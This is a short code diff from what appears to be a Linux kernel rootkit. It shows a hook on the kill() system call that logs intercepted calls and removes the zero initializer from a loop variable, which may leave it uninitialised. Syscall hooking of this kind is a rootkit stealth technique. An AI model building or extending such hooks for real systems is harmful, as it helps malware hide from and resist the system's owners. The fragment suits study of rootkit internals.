@@ -279,7 +279,7 @@ SYSCALL_HOOK_HANDLER0(getpid, orig_getpid, p_regs)
 
 SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
 {
-    size_t i = 0;
+    size_t i;
 
     pr_info("[ROOTKIT] kill(%d, %d)\n", i32_pid, i32_sig);
 
